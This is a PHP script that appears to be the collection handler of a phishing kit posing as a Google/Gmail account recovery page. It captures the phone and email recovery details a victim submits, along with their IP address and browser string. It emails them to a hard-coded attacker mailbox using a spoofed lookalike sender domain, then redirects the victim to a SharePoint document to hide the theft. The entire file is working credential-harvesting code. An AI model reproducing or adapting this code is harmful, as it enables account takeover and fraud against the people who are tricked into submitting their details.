<?
$IP = getenv("REMOTE_ADDR");
$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "Phone".$_POST['emailphone']."\n";
$message .= "Phone".$_POST['emailphone2']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="e.wizeman41@gmail.com";

$subject = "Awake | grnail Recovery LIST";
$headers = "From: OneDocment <NONE@ggledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://appriver3651010941-my.sharepoint.com/personal/tgranoski_merchcoservices_com/_layouts/15/guestaccess.aspx?docid=11ff83cd256e048e99ef7ae29687509a5&authkey=AaJ_aMQFNoJxyX_LzT1oel0");
?>